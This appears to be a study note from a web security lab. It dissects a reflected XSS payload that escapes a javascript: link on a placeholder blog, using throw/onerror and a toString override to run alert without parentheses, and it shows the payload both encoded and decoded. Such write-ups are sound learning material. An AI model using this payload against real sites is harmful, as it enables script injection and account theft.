# javascript tricks

```
https://www.qwe.com/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

url decode ->

```
https://www.qwe.com/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

## what is happening?

website basic setup:

```
https://www.qwe.com/post?postId=5
```

parameters ends up in the anchor tag below:

```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```

url decode ->

```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```

the extra parameters will break out from the fetch:

```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```

url decode ->

```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```

## how does it break out?

```
https://www.qwe.com/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

ends up in

```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```

---

`https://www.qwe.com/post?postId=5` -> original url

---

`&` -> needed for the browser url

---

`'}` -> closes the `{method:'post',body:'/post?postId=5&` object what will become `{method:'post',body:'/post?postId=5&'}`

---

`,` -> from this point the fetch method gets extra parameters -> js does not mind it tho, so the `,` just separates the different parameters

---

`x=x=>{throw/**/onerror=alert,1337}` -> first new parameter, it is an arrow function like this:

```
let x = (x) => {
    throw onerror = alert, 1337
}
```

since in this lab the url blocks the brackets the `x==>{...}` would not work, that is why the second `x` is in the arrow function `x=x=>{...}` even it is not used

throw 1337 creates an uncaught exception
The browser then calls the global error handler (onerror)

the `throw` will creates an uncaught exception with the last argument and the browser will calls the global error handler which is the `onerror`, and the `onerror` was assigned at the `alert` function, so the `throw 1337` ends up calling `alert(1337)` in the end

- in parameters if there is an expression it will be evaluated, that is why `onerror` is now `alert`

```
let num = 10;
console.log(num); // 10
alert("new value", num = 20);
console.log(num) // 20
```

- `throw` is a statement that can not be passed as a function parameter but it can live in a function tho

---

`toString=x` -> the `toString` function assigned to `x` what is the `x=x=>{throw/**/onerror=alert,1337}` function, any time the `toString` function get called the `x` function will be executed what will be used in the next parameter

---

`window+''` -> this expression try to concat the `window` object with an empty string with the `+` operator, in this case the `toString` gets called what is the `x` function now so its content get executed what is the exploit itself

---

`{x:'` -> fixes the js syntax

- the leftover code is -> `'}` that needs to be syntactically correct that ends up `{x:''}`
